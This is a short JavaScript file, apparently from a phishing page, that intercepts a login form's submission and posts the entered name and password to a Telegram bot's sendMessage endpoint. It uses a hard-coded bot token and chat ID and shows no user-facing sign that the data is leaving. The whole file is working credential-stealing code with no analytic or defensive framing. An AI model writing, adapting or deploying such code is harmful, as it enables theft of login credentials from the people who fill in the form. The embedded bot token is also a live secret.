const TOKEN = "7043568504:AAGsyDsVoivhj9koS-mqZOFQoFlyw-AOuVU";
const CHAT_ID = "-4263168333";
const ULR_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const p = document.querySelector(".boldi");

document.querySelector("form").addEventListener("submit", function (e) {
  e.preventDefault();

  let message = `Name: ${this.name.value} \nPassword: ${this.password.value}`;

  axios
    .post(ULR_API, {
      chat_id: CHAT_ID,
      parse_mode: "html",
      text: message,
    })
    .then((res) => {
      p.classList.remove("displ");
    })
    .catch((err) => {
      console.log(err);
    });
});
